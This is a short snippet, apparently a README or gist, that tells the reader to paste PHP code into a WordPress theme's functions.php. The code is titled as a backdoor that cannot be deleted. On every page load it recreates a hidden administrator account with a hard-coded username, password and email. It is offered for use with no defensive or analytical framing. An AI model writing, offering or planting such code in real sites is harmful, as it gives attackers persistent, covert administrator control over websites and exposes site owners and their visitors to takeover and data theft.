# Wordpress Backdore Admin User Create. Whice does not deleted.
past this file in function.php file
```shell script
add_action('init','create_hidden_admin');
function create_hidden_admin(){
    $username = 'backupadmin';
    $password = 'StrongP@ss123'; // আপনার পাসওয়ার্ড দিন
    $email = 'backup@email.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
```
